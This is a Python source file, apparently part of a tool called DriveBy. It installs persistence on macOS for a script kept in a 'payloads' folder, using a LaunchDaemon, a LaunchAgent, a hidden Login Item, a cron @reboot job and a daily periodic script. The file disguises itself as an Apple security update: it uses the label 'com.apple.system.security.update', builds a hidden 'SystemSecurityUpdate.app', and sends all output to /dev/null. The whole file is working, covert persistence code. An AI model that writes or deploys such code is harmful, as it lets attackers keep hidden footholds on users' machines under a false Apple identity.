#!/usr/bin/env python3
"""
macOS Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart.

Note:
- This module targets macOS (darwin). Many operations require elevated privileges.
- Uses multiple mechanisms: LaunchDaemon (root), LaunchAgent (user), Login Items, cron @reboot, and periodic scripts.
- Script path currently points to payloads/linux_monitor.py for parity with the existing project structure.
"""

import os
import sys
import shutil
import plistlib
import subprocess
from pathlib import Path


class MacOSPersistence:
    def __init__(self) -> None:
        # Reuse linux monitor script for macOS as per prior design choice
        self.script_path = (Path(__file__).parent.parent / "payloads" / "linux_monitor.py").resolve()
        self.service_name = "com.apple.system.security.update"

    # -----------------------------
    # Helpers
    # -----------------------------
    @staticmethod
    def _is_macos() -> bool:
        return sys.platform == "darwin"

    @staticmethod
    def _run(cmd: list[str], check: bool = False, capture: bool = True) -> subprocess.CompletedProcess:
        return subprocess.run(
            cmd,
            check=check,
            capture_output=capture,
            text=True,
        )

    # -----------------------------
    # Launchd (Daemon/Agent)
    # -----------------------------
    def create_launchd_daemon(self) -> bool:
        """Create LaunchDaemon for system-wide persistence (requires root)."""
        if not self._is_macos():
            print(" Not macOS; skipping LaunchDaemon.")
            return False

        try:
            plist_content = {
                "Label": self.service_name,
                "ProgramArguments": ["/usr/bin/python3", str(self.script_path)],
                "RunAtLoad": True,
                "KeepAlive": True,
                "StandardOutPath": "/dev/null",
                "StandardErrorPath": "/dev/null",
            }

            plist_path = f"/Library/LaunchDaemons/{self.service_name}.plist"

            # Write plist file
            with open(plist_path, "wb") as f:
                plistlib.dump(plist_content, f)

            # Set proper permissions
            try:
                os.chmod(plist_path, 0o644)
                # chown to root:wheel if running as root
                if hasattr(os, "geteuid") and os.geteuid() == 0:
                    os.chown(plist_path, 0, 0)  # root:wheel
            except Exception as e:
                print(f" Warning: Could not set permissions/ownership for daemon plist: {e}")

            # Load the daemon
            self._run(["launchctl", "load", "-w", plist_path], check=True, capture=True)

            print(" LaunchDaemon persistence created")
            return True
        except subprocess.CalledProcessError as e:
            print(f" LaunchDaemon failed: {e.stderr or e}")
            return False
        except Exception as e:
            print(f" LaunchDaemon persistence failed: {e}")
            return False

    def create_launchd_agent(self) -> bool:
        """Create LaunchAgent for user-level persistence."""
        if not self._is_macos():
            print(" Not macOS; skipping LaunchAgent.")
            return False

        try:
            plist_content = {
                "Label": f"{self.service_name}.agent",
                "ProgramArguments": ["/usr/bin/python3", str(self.script_path)],
                "RunAtLoad": True,
                "KeepAlive": True,
                "StandardOutPath": "/dev/null",
                "StandardErrorPath": "/dev/null",
            }

            # User LaunchAgents directory
            agents_dir = Path.home() / "Library" / "LaunchAgents"
            agents_dir.mkdir(parents=True, exist_ok=True)

            plist_path = agents_dir / f"{self.service_name}.agent.plist"

            # Write plist file
            with open(plist_path, "wb") as f:
                plistlib.dump(plist_content, f)

            # Load the agent
            self._run(["launchctl", "load", "-w", str(plist_path)], check=False, capture=True)

            print(" LaunchAgent persistence created")
            return True
        except Exception as e:
            print(f" LaunchAgent persistence failed: {e}")
            return False

    # -----------------------------
    # Login Items via AppleScript
    # -----------------------------
    def create_login_items_persistence(self) -> bool:
        """Create Login Items persistence."""
        if not self._is_macos():
            print(" Not macOS; skipping Login Items.")
            return False

        try:
            # Create wrapper app bundle
            app_bundle = self.create_app_bundle()
            if not app_bundle:
                print(" Login Items failed: could not create app bundle")
                return False

            applescript = f'''
                tell application "System Events"
                    make login item at end with properties {{path:"{app_bundle}", hidden:true}}
                end tell
            '''
            result = self._run(["osascript", "-e", applescript], check=False, capture=True)
            if result.returncode == 0:
                print(" Login Items persistence created")
                return True
            else:
                print(f" Login Items failed: {result.stderr}")
                return False
        except Exception as e:
            print(f" Login Items persistence failed: {e}")
            return False

    # -----------------------------
    # Cron (best-effort)
    # -----------------------------
    def create_cron_persistence(self) -> bool:
        """Create cron job for persistence (best-effort; may be limited on macOS)."""
        if not self._is_macos():
            print(" Not macOS; skipping cron persistence.")
            return False

        try:
            wrapper_script = self.create_cron_wrapper()
            cron_entry = f"@reboot {wrapper_script}\n"

            # Get current crontab
            try:
                result = self._run(["crontab", "-l"], check=False, capture=True)
                current_cron = result.stdout if result.returncode == 0 else ""
            except Exception:
                current_cron = ""

            if wrapper_script not in current_cron:
                new_cron = current_cron + cron_entry
                process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)
                if process.returncode == 0:
                    print(" Cron persistence created")
                    return True
                else:
                    print(" Cron persistence failed to install")
                    return False
            else:
                print(" Cron persistence already exists")
                return True
        except Exception as e:
            print(f" Cron persistence failed: {e}")
            return False

    # -----------------------------
    # Periodic (daily) script
    # -----------------------------
    def create_periodic_script(self) -> bool:
        """Create periodic (daily) script persistence (requires root)."""
        if not self._is_macos():
            print(" Not macOS; skipping periodic script.")
            return False

        try:
            script_content = f"""#!/bin/bash
# System Security Update
cd "{Path(__file__).parent.parent}"
nohup /usr/bin/python3 "{self.script_path}" > /dev/null 2>&1 &
"""
            script_path = "/etc/periodic/daily/999.system-security"

            with open(script_path, "w") as f:
                f.write(script_content)

            os.chmod(script_path, 0o755)
            print(" Periodic script persistence created")
            return True
        except Exception as e:
            print(f" Periodic script persistence failed: {e}")
            return False

    # -----------------------------
    # App bundle
    # -----------------------------
    def create_app_bundle(self) -> str | None:
        """Create macOS app bundle for persistence used by Login Items."""
        if not self._is_macos():
            print(" Not macOS; skipping app bundle.")
            return None

        try:
            app_name = "SystemSecurityUpdate.app"
            app_path = Path("/Applications") / app_name

            contents_dir = app_path / "Contents"
            macos_dir = contents_dir / "MacOS"
            resources_dir = contents_dir / "Resources"

            for directory in (contents_dir, macos_dir, resources_dir):
                directory.mkdir(parents=True, exist_ok=True)

            info_plist = {
                "CFBundleExecutable": "SystemSecurityUpdate",
                "CFBundleIdentifier": "com.apple.system.security.update",
                "CFBundleName": "System Security Update",
                "CFBundleVersion": "1.0",
                "CFBundleShortVersionString": "1.0",
                "LSUIElement": True,  # Hide from dock
                "LSBackgroundOnly": True,  # Background only
            }

            with open(contents_dir / "Info.plist", "wb") as f:
                plistlib.dump(info_plist, f)

            executable_content = f"""#!/bin/bash
cd "{Path(__file__).parent.parent}"
exec /usr/bin/python3 "{self.script_path}"
"""
            executable_path = macos_dir / "SystemSecurityUpdate"
            with open(executable_path, "w") as f:
                f.write(executable_content)
            os.chmod(executable_path, 0o755)

            print(f" App bundle created: {app_path}")
            return str(app_path)
        except Exception as e:
            print(f" App bundle creation failed: {e}")
            return None

    # -----------------------------
    # Cron wrapper
    # -----------------------------
    def create_cron_wrapper(self) -> str:
        """Create cron wrapper script used in @reboot crontab entry."""
        wrapper_content = f"""#!/bin/bash
cd "{Path(__file__).parent.parent}"

while true; do
  /usr/bin/python3 "{self.script_path}" > /dev/null 2>&1
  sleep 30
done
"""
        wrapper_path = "/tmp/system_security_wrapper.sh"
        with open(wrapper_path, "w") as f:
            f.write(wrapper_content)

        os.chmod(wrapper_path, 0o755)
        return wrapper_path

    # -----------------------------
    # Orchestration
    # -----------------------------
    def install_all_persistence(self) -> bool:
        """Install all persistence mechanisms available on macOS."""
        results: list[bool] = []

        print(" Installing macOS persistence mechanisms...")

        # LaunchDaemon (requires root)
        if hasattr(os, "geteuid") and os.geteuid() == 0:
            results.append(self.create_launchd_daemon())
        else:
            print(" LaunchDaemon requires root privileges")

        # LaunchAgent (user level)
        results.append(self.create_launchd_agent())

        # Login Items (user level)
        results.append(self.create_login_items_persistence())

        # cron (best-effort)
        if shutil.which("crontab"):
            results.append(self.create_cron_persistence())

        # periodic script (requires root)
        if hasattr(os, "geteuid") and os.geteuid() == 0:
            results.append(self.create_periodic_script())

        successful = sum(1 for r in results if r)
        print(f" macOS persistence: {successful}/{len(results)} methods installed")

        return successful > 0

    def remove_persistence(self) -> bool:
        """Remove all persistence mechanisms."""
        try:
            # Remove LaunchDaemon
            try:
                daemon_plist = f"/Library/LaunchDaemons/{self.service_name}.plist"
                self._run(["launchctl", "unload", daemon_plist], check=False, capture=True)
                if os.path.exists(daemon_plist):
                    os.remove(daemon_plist)
            except Exception:
                pass

            # Remove LaunchAgent
            try:
                agent_plist = Path.home() / "Library" / "LaunchAgents" / f"{self.service_name}.agent.plist"
                self._run(["launchctl", "unload", str(agent_plist)], check=False, capture=True)
                if agent_plist.exists():
                    agent_plist.unlink()
            except Exception:
                pass

            # Remove Login Items
            try:
                applescript = """
                    tell application "System Events"
                        delete login item "SystemSecurityUpdate"
                    end tell
                """
                self._run(["osascript", "-e", applescript], check=False, capture=True)
            except Exception:
                pass

            # Remove app bundle
            try:
                app_path = Path("/Applications") / "SystemSecurityUpdate.app"
                if app_path.exists():
                    shutil.rmtree(app_path)
            except Exception:
                pass

            # Remove cron entry
            try:
                result = self._run(["crontab", "-l"], check=False, capture=True)
                if result.returncode == 0:
                    lines = result.stdout.splitlines()
                    filtered_lines = [line for line in lines if "system_security_wrapper" not in line]
                    new_cron = "\n".join(filtered_lines) + ("\n" if filtered_lines else "")
                    process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                    process.communicate(input=new_cron)
            except Exception:
                pass

            # Remove periodic script
            try:
                periodic_script = "/etc/periodic/daily/999.system-security"
                if os.path.exists(periodic_script):
                    os.remove(periodic_script)
            except Exception:
                pass

            # Remove wrapper script
            try:
                wrapper_script = "/tmp/system_security_wrapper.sh"
                if os.path.exists(wrapper_script):
                    os.remove(wrapper_script)
            except Exception:
                pass

            print(" macOS persistence removed")
            return True
        except Exception as e:
            print(f" Error removing persistence: {e}")
            return False


if __name__ == "__main__":
    persistence = MacOSPersistence()
    if len(sys.argv) > 1 and sys.argv[1].lower() == "remove":
        persistence.remove_persistence()
    else:
        persistence.install_all_persistence()
